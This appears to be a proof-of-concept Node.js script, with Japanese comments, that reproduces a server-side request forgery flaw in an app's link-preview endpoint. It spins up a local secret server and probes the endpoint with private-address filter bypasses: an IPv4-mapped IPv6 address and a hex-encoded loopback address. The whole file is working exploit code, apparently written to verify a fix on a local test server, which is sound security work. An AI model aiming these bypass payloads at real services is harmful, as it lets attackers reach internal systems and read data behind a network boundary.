#!/usr/bin/env node
// PoC 1: link-preview SSRF — ローカルのみ対象。prodに実行禁止。
// 使い方: npm run dev:test を別シェルで起動してから node poc/ssrf-link-preview.mjs
// 期待: [::ffff:127.0.0.1] で内部タイトルが読めたら VULN。
import http from 'node:http';

const BASE = process.env.BASE_URL ?? 'http://localhost:8788';
const SECRET = 'PWNED-INTERNAL';

function startSecretServer() {
  return new Promise((resolve) => {
    const srv = http.createServer((_req, res) => {
      res.writeHead(200, { 'content-type': 'text/html' });
      res.end(`<html><head><title>${SECRET}</title></head><body>secret</body></html>`);
    });
    srv.listen(0, '127.0.0.1', () => resolve(srv));
  });
}

async function probe(label, targetUrl) {
  const r = await fetch(`${BASE}/api/link-preview?url=${encodeURIComponent(targetUrl)}`);
  const body = await r.text();
  const leaked = body.includes(SECRET);
  console.log(`[${leaked ? 'VULN' : 'OK'}] ${label} -> HTTP ${r.status} leaked=${leaked}`);
  if (leaked) console.log(`  body: ${body.slice(0, 200)}`);
  return leaked;
}

const srv = await startSecretServer();
const port = srv.address().port;
console.log(`secret server: 127.0.0.1:${port} (BASE=${BASE})`);
let vuln = false;
try {
  // 対照: リテラル127.0.0.1はブロックされるはず
  await probe('control literal 127.0.0.1 (expect OK/blocked)', `http://127.0.0.1:${port}/secret`);
  // 本命1: IPv4-mapped IPv6
  vuln ||= await probe('bypass [::ffff:127.0.0.1]', `http://[::ffff:127.0.0.1]:${port}/secret`);
  // 本命2: 10進数/8進数など別表記 (isPrivateIPは10進4octetのみ検査)
  vuln ||= await probe('bypass 0x7f.0.0.1 hex', `http://0x7f.0.0.1:${port}/secret`);
} finally {
  srv.close();
}
console.log(vuln ? '\nRESULT: VULNERABLE (SSRF再現)' : '\nRESULT: not reproduced (対策済み or サーバ未起動)');
process.exit(vuln ? 1 : 0);
